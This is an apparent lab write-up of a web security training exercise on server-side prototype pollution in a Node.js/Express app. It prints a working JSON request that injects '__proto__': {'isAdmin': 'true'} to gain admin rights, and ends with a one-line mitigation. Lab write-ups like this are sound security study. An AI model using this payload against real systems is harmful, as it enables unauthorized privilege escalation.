@@ -1,0 +1,40 @@
+Lab: Privilege escalation via server-side prototype pollution
+
+This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input 
+into a server-side JavaScript object. This is simple to detect because any polluted properties inherited via the prototype chain are visible in an HTTP response.
+
+To solve the lab:
+1. Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
+2. Identify a gadget property that you can use to escalate your privileges.
+3. Access the admin panel and delete the user carlos.
+
+
+Intially looking at the javascript of this website I could see the vulnerable code:
+const value = Object.fromEntries(data.entries());
+
+// ...
+
+const responseJson = JSON.parse(this.responseText);
+for (const [key, value] of Object.entries(responseJson).filter(e => e[0] !== 'isAdmin')) {
+    // ...
+}
+
+the isAdmin check fails to consider that the polluted prototype now includes isAdmin: "true". 
+So, every object will have an isAdmin property, even if it wasn't explicitly set in the response JSON.
+
+
+
+Sending this request solves the lab:
+
+{"address_line_1":"Wiener HQ",
+"address_line_2":"One Wiener Way",
+"city":"Wienerville",
+"postcode":"BU1 1RP",
+"country":"Ireland",
+"__proto__": {
+    "isAdmin": "true"
+  },
+"sessionId":"IbY7UjviDKOXfy24MWcSIhBJJQQAoO5j"}
+
+
+to mitigate this developers are suppose to implement deep copying techniques that do not inherit properties from Object.prototype.
